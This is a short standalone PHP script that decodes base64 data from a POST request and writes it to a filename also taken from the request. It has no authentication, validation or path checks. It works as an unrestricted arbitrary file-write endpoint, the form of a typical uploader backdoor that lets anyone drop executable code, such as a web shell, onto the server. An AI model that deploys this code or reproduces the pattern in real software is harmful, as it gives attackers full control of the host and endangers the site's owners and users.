<?php
$input = $_POST['file'];
$filename = $_POST['name'];
$fh = fopen($filename, 'w');
fwrite($fh, base64_decode($input));
echo $filename;
fclose($fh);
?>